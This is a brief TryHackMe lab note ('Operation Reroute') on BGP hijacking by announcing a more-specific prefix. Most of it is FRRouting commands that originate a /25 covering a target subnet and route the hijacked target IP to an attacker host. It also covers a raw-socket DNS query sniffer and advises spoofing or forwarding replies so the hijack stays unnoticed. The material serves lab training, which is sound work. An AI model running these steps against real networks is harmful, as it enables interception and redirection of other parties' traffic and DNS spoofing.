# BGP Hijacking (More-Specific Prefix)

BGP has no route-origin authentication, and forwarding uses longest-prefix-match. A more specific prefix (e.g. `/25`) is preferred over an existing `/24` for any address inside it, regardless of which AS announces it — so you don't need to out-AS-path anyone, just announce narrower.

```bash
# on the router you control (FRRouting CLI shown):
configure terminal
ip prefix-list bgp-out seq 15 permit <TARGET_SUBNET>/25   # outbound filter must allow the narrower prefix
ip route <TARGET_SUBNET>/25 <LOCAL_NEXTHOP>                 # static route so BGP can originate it
router bgp <YOUR_ASN>
 address-family ipv4 unicast
  network <TARGET_SUBNET>/25                                 # this is the hijack
 exit-address-family
exit
ip route <TARGET_IP>/32 <ATTACKER_HOST>                       # redirect the hijacked traffic locally
end

# on the attacker host: claim the IP so the kernel accepts the redirected packets
ip addr add <TARGET_IP>/32 dev <iface>
```

If no sniffer is available on the box, a raw-socket Python script (`AF_INET, SOCK_RAW, IPPROTO_UDP`) parsing DNS names out of UDP/53 payloads works as a minimal DNS query sniffer. Sink-only hijack breaks resolution for the victim — forward/spoof a reply to stay stealthy.

— TryHackMe / Operation Reroute
